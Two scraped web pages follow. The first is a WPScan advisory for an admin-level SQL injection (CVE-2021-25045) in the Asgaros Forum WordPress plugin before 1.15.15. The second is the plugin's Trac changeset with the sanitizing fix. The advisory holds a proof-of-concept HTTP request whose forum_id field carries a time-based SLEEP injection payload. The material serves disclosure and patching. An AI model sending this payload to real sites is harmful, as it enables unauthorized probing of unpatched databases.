=== Content from wpscan.com_d6c3f8ef_20250114_214952.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Asgaros Forum < 1.15.15 - Admin+ SQL Injection via forum\_id

### Description

The plugin does not validate or escape the forum\_id parameter before using it in a SQL statement when editing a forum, leading to an SQL injection issue

### Proof of Concept

POST /wp-admin/admin.php?page=asgarosforum-structure HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 289
Connection: close
Cookie: [admin+]
Upgrade-Insecure-Requests: 1
\_wpnonce=bc051820af&forum\_id=1%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP(5)))b)&forum\_category=79&forum\_parent\_forum=0&forum\_name=First+Forum&forum\_description=My+first+forum.&forum\_parent=79\_0&forum\_icon=fas+fa-comments&forum\_status=normal&forum\_order=1&af-create-edit-forum-submit=Save

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

asgaros-forum](https://a8cteam5105.wordpress.com/plugin/asgaros-forum/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 1.15.15

### References

CVE
[CVE-2021-25045](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25045)

URL
<https://plugins.trac.wordpress.org/changeset/2642215>

### Classification

Type
SQLI

OWASP top 10
[A1: Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection)

CWE
[CWE-89](https://cwe.mitre.org/data/definitions/89.html)

CVSS
[6.8 (medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N)

### Miscellaneous

Original Researcher
Trang LKB

Submitter
Channchan

Verified
Yes

WPVDB ID
[c60a3d40-449c-4c84-8d13-68c04267c1d7](https://a8cteam5105.wordpress.com/vulnerability/c60a3d40-449c-4c84-8d13-68c04267c1d7/)

### Timeline

Publicly Published
2021-12-21 (about 3 years ago)

Added
2021-12-21 (about 3 years ago)

Last Updated
2022-04-13 (about 2 years ago)

### Other

Published
Title

Published
2021-11-15
Title
[StopBadBots < 6.67 - Unauthenticated SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/1e4dd002-6c96-44f9-bd55-61359265f7ae/)

Published
2014-08-01
Title
[NextGEN Smooth Gallery - Blind SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/1b8d3883-7528-43d1-ac1e-3388126a1e49/)

Published
2018-09-05
Title
[Image Intense <= 3.2.5 - Authenticated SQL Injection in shortcodes](https://a8cteam5105.wordpress.com/vulnerability/5e0af7b2-797c-4774-b261-36976467a293/)

Published
2021-10-05
Title
[Perfect Survey < 1.5.2 - Unauthenticated SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad/)

Published
2024-06-10
Title
[Quiz And Survey Master < 9.0.2 - Contributor+ SQLi](https://a8cteam5105.wordpress.com/vulnerability/e3eee6bc-1f69-4be1-b323-0c9b5fe7535e/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from plugins.trac.wordpress.org_04972aaf_20250114_214951.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F2642215)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Changeset](/changeset/2642214 "Changeset 2642214")
* [Next Changeset](/changeset/2642216 "Changeset 2642216") →

---

# Changeset 2642215

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
12/10/2021 06:13:59 AM
([3 years](/timeline?from=2021-12-10T06%3A13%3A59Z&precision=second "See timeline at 12/10/2021 06:13:59 AM") ago)

Author:
Asgaros
Message:

Updating Asgaros Forum to version 1.15.15:

* Fixed: SQL injection vulnerability in the approval-functionality
* Fixed: Prevent cross-site request forgery when creating, editing or deleting posts and topics
* Fixed: Add missing sanitizing for input data
* Fixed: Use sanitizing instead of escaping functions for input data
* Fixed: Add missing escaping for output data

Location:
[asgaros-forum](/browser/asgaros-forum?rev=2642215)
Files:

105 added
13 edited

* [tags/1.15.15](/browser/asgaros-forum/tags/1.15.15?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/.github](/browser/asgaros-forum/tags/1.15.15/.github?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/.github/FUNDING.yml](/browser/asgaros-forum/tags/1.15.15/.github/FUNDING.yml?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/CODE\_OF\_CONDUCT.md](/browser/asgaros-forum/tags/1.15.15/CODE_OF_CONDUCT.md?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/LICENSE](/browser/asgaros-forum/tags/1.15.15/LICENSE?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin](/browser/asgaros-forum/tags/1.15.15/admin?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/admin.php](/browser/asgaros-forum/tags/1.15.15/admin/admin.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/css](/browser/asgaros-forum/tags/1.15.15/admin/css?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/css/admin.css](/browser/asgaros-forum/tags/1.15.15/admin/css/admin.css?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/images](/browser/asgaros-forum/tags/1.15.15/admin/images?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/images/logo.png](/browser/asgaros-forum/tags/1.15.15/admin/images/logo.png?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/js](/browser/asgaros-forum/tags/1.15.15/admin/js?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/js/admin.js](/browser/asgaros-forum/tags/1.15.15/admin/js/admin.js?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/tables](/browser/asgaros-forum/tags/1.15.15/admin/tables?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/tables/admin-ads-table.php](/browser/asgaros-forum/tags/1.15.15/admin/tables/admin-ads-table.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/tables/admin-structure-table.php](/browser/asgaros-forum/tags/1.15.15/admin/tables/admin-structure-table.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/tables/admin-usergroups-table.php](/browser/asgaros-forum/tags/1.15.15/admin/tables/admin-usergroups-table.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/views](/browser/asgaros-forum/tags/1.15.15/admin/views?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/views/ads.php](/browser/asgaros-forum/tags/1.15.15/admin/views/ads.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/views/appearance.php](/browser/asgaros-forum/tags/1.15.15/admin/views/appearance.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/views/options.php](/browser/asgaros-forum/tags/1.15.15/admin/views/options.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/views/structure.php](/browser/asgaros-forum/tags/1.15.15/admin/views/structure.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/admin/views/usergroups.php](/browser/asgaros-forum/tags/1.15.15/admin/views/usergroups.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/asgaros-forum.php](/browser/asgaros-forum/tags/1.15.15/asgaros-forum.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/hooks.md](/browser/asgaros-forum/tags/1.15.15/hooks.md?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes](/browser/asgaros-forum/tags/1.15.15/includes?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-activity.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-activity.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-ads.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-ads.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-appearance.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-appearance.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-approval.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-approval.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-breadcrumbs.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-breadcrumbs.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-compatibility.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-compatibility.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-content.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-content.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-database.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-database.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-editor.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-editor.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-feed.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-feed.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-memberslist.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-memberslist.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-mentioning.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-mentioning.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-notifications.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-notifications.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-online.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-online.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-pagination.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-pagination.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-permissions.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-permissions.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-polls.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-polls.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-profile.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-profile.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-reactions.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-reactions.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-reports.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-reports.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-rewrite.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-rewrite.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-search.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-search.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-shortcodes.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-shortcodes.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-spoilers.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-spoilers.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-statistics.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-statistics.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-unread.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-unread.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-uploads.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-uploads.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-user-query.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-user-query.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-usergroups.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-usergroups.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum-widgets.php](/browser/asgaros-forum/tags/1.15.15/includes/forum-widgets.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/forum.php](/browser/asgaros-forum/tags/1.15.15/includes/forum.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/views](/browser/asgaros-forum/tags/1.15.15/includes/views?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/views/forum.php](/browser/asgaros-forum/tags/1.15.15/includes/views/forum.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/views/overview.php](/browser/asgaros-forum/tags/1.15.15/includes/views/overview.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/includes/views/post-element.php](/browser/asgaros-forum/tags/1.15.15/includes/views/post-element.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/integrations](/browser/asgaros-forum/tags/1.15.15/integrations?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/integrations/integration-mycred.php](/browser/asgaros-forum/tags/1.15.15/integrations/integration-mycred.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/js](/browser/asgaros-forum/tags/1.15.15/js?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/js/script-mentioning.js](/browser/asgaros-forum/tags/1.15.15/js/script-mentioning.js?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/js/script-spoilers.js](/browser/asgaros-forum/tags/1.15.15/js/script-spoilers.js?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/js/script.js](/browser/asgaros-forum/tags/1.15.15/js/script.js?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/languages](/browser/asgaros-forum/tags/1.15.15/languages?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/languages/asgaros-forum.pot](/browser/asgaros-forum/tags/1.15.15/languages/asgaros-forum.pot?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs](/browser/asgaros-forum/tags/1.15.15/libs?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/LICENSE.txt](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/LICENSE.txt?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/css](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/css?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/css/all.min.css](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/css/all.min.css?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/css/v4-shims.min.css](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/css/v4-shims.min.css?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-brands-400.eot](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-brands-400.eot?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-brands-400.svg](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-brands-400.svg?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-brands-400.ttf](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-brands-400.ttf?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-brands-400.woff](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-brands-400.woff?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-brands-400.woff2](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-brands-400.woff2?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-regular-400.eot](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-regular-400.eot?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-regular-400.svg](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-regular-400.svg?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-regular-400.ttf](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-regular-400.ttf?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-regular-400.woff](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-regular-400.woff?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-regular-400.woff2](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-regular-400.woff2?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-solid-900.eot](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-solid-900.eot?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-solid-900.svg](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-solid-900.svg?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-solid-900.ttf](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-solid-900.ttf?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-solid-900.woff](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-solid-900.woff?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/fontawesome/webfonts/fa-solid-900.woff2](/browser/asgaros-forum/tags/1.15.15/libs/fontawesome/webfonts/fa-solid-900.woff2?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/jquery.atwho.js](/browser/asgaros-forum/tags/1.15.15/libs/jquery.atwho.js?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/libs/jquery.caret.js](/browser/asgaros-forum/tags/1.15.15/libs/jquery.caret.js?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/readme.txt](/browser/asgaros-forum/tags/1.15.15/readme.txt?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/skin](/browser/asgaros-forum/tags/1.15.15/skin?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/skin/editor.css](/browser/asgaros-forum/tags/1.15.15/skin/editor.css?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/skin/rtl.css](/browser/asgaros-forum/tags/1.15.15/skin/rtl.css?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/skin/style-mentioning.css](/browser/asgaros-forum/tags/1.15.15/skin/style-mentioning.css?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/skin/style.css](/browser/asgaros-forum/tags/1.15.15/skin/style.css?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/skin/widgets.css](/browser/asgaros-forum/tags/1.15.15/skin/widgets.css?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/uninstall.php](/browser/asgaros-forum/tags/1.15.15/uninstall.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/widgets](/browser/asgaros-forum/tags/1.15.15/widgets?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/widgets/widget-recent-posts.php](/browser/asgaros-forum/tags/1.15.15/widgets/widget-recent-posts.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/widgets/widget-recent-topics.php](/browser/asgaros-forum/tags/1.15.15/widgets/widget-recent-topics.php?rev=2642215 "Show entry in browser")
  (added)
* [tags/1.15.15/widgets/widget-search.php](/browser/asgaros-forum/tags/1.15.15/widgets/widget-search.php?rev=2642215 "Show entry in browser")
  (added)
* [trunk/admin/admin.php](/browser/asgaros-forum/trunk/admin/admin.php?rev=2642215 "Show entry in browser")
  (modified)
  ([1 diff](#file105 "Show differences"))
* [trunk/asgaros-forum.php](/browser/asgaros-forum/trunk/asgaros-forum.php?rev=2642215 "Show entry in browser")
  (modified)
  ([1 diff](#file106 "Show differences"))
* [trunk/includes/forum-approval.php](/browser/asgaros-forum/trunk/includes/forum-approval.php?rev=2642215 "Show entry in browser")
  (modified)
  ([1 diff](#file107 "Show differences"))
* [trunk/includes/forum-content.php](/browser/asgaros-forum/trunk/includes/forum-content.php?rev=2642215 "Show entry in browser")
  (modified)
  ([2 diffs](#file108 "Show differences"))
* [trunk/includes/forum-editor.php](/browser/asgaros-forum/trunk/includes/forum-editor.php?rev=2642215 "Show entry in browser")
  (modified)
  ([1 diff](#file109 "Show differences"))
* [trunk/includes/forum-memberslist.php](/browser/asgaros-forum/trunk/includes/forum-memberslist.php?rev=2642215 "Show entry in browser")
  (modified)
  ([2 diffs](#file110 "Show differences"))
* [trunk/includes/forum-online.php](/browser/asgaros-forum/trunk/includes/forum-online.php?rev=2642215 "Show entry in browser")
  (modified)
  ([3 diffs](#file111 "Show differences"))
* [trunk/includes/forum-profile.php](/browser/asgaros-forum/trunk/includes/forum-profile.php?rev=2642215 "Show entry in browser")
  (modified)
  ([4 diffs](#file112 "Show differences"))
* [trunk/includes/forum-rewrite.php](/browser/asgaros-forum/trunk/includes/forum-rewrite.php?rev=2642215 "Show entry in browser")
  (modified)
  ([1 diff](#file113 "Show differences"))
* [trunk/includes/forum-search.php](/browser/asgaros-forum/trunk/includes/forum-search.php?rev=2642215 "Show entry in browser")
  (modified)
  ([3 diffs](#file114 "Show differences"))
* [trunk/includes/forum-usergroups.php](/browser/asgaros-forum/trunk/includes/forum-usergroups.php?rev=2642215 "Show entry in browser")
  (modified)
  ([1 diff](#file115 "Show differences"))
* [trunk/includes/forum.php](/browser/asgaros-forum/trunk/includes/forum.php?rev=2642215 "Show entry in browser")
  (modified)
  ([11 diffs](#file116 "Show differences"))
* [trunk/readme.txt](/browser/asgaros-forum/trunk/readme.txt?rev=2642215 "Show entry in browser")
  (modified)
  ([2 diffs](#file117 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [asgaros-forum/trunk/admin/admin.php](/changeset/2642215/asgaros-forum/trunk/admin/admin.php "Show the changeset 2642215 restricted to asgaros-forum/trunk/admin/admin.php")

  | [r2332661](/browser/asgaros-forum/trunk/admin/admin.php?rev=2332661#L370 "Show revision 2332661 of this file in browser") | [r2642215](/browser/asgaros-forum/trunk/admin/admin.php?rev=2642215#L370 "Show revision 2642215 of this file in browser") |  |
  | --- | --- | --- |
  | 370 | 370 | $saved\_ops[$k] = (bool)$\_POST[$k]; |
  | 371 | 371 | } else if ($k === 'allowed\_filetypes') { |
  | 372 |  | $tmp = str~~ipslashes(strtolower(trim($\_POST[$k])~~)); |
  |  | 372 | $tmp = strtolower(sanitize\_text\_field($\_POST[$k])); |
  | 373 | 373 | $saved\_ops[$k] = (!empty($tmp)) ? $tmp : $v; |
  | 374 | 374 | } else { |
  | 375 |  | $tmp = s~~tripslashes(trim($\_POST[$k])~~); |
  |  | 375 | $tmp = sanitize\_text\_field($\_POST[$k]); |
  | 376 | 376 | $saved\_ops[$k] = (!empty($tmp)) ? $tmp : $v; |
  | 377 | 377 | } |
* ## [asgaros-forum/trunk/asgaros-forum.php](/changeset/2642215/asgaros-forum/trunk/asgaros-forum.php "Show the changeset 2642215 restricted to asgaros-forum/trunk/asgaros-forum.php")

  | [r2635143](/browser/asgaros-forum/trunk/asgaros-forum.php?rev=2635143#L5 "Show revision 2635143 of this file in browser") | [r2642215](/browser/asgaros-forum/trunk/asgaros-forum.php?rev=2642215#L5 "Show revision 2642215 of this file in browser") |  |
  | --- | --- | --- |
  | 5 | 5 | Plugin URI: https://www.asgaros.de |
  | 6 | 6 | Description: Asgaros Forum is the best forum solution for WordPress! It comes with dozens of features in a beautiful design and stays slight, simple and fast. |
  | 7 |  | Version: 1.15.1~~4~~ |
  |  | 7 | Version: 1.15.15 |
  | 8 | 8 | Author: Thomas Belser |
  | 9 | 9 | Author URI: https://www.asgaros.de |
